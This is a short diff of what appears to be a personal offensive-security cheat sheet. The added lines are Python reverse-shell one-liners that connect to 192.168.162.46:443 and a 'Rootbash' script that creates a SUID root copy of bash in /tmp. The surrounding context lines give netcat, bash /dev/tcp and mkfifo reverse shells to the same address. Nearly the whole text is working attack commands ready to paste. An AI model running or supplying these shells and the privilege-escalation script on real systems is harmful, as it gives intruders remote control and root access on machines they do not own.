@@ -24,6 +24,14 @@ nc -nv 192.168.162.46 443 -e /bin/bash
 netcat -e /bin/bash 192.168.162.46 443
 bash -i >& /dev/tcp/192.168.162.46/443 0>&1
 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.162.46 443 > /tmp/f
+python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.162.46",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);' 
+python3 -c 'import pty;import socket,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.162.46",443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")' 
+
+Rootbash
+#!/usr/bin/env python
+import os
+import sys
+os.system('cp /bin/bash /tmp/rootbash; chown root:root /tmp/rootbash; chmod +s /tmp/rootbash')
 
 Catch a dying shell 
 kali> vim perl.shell  
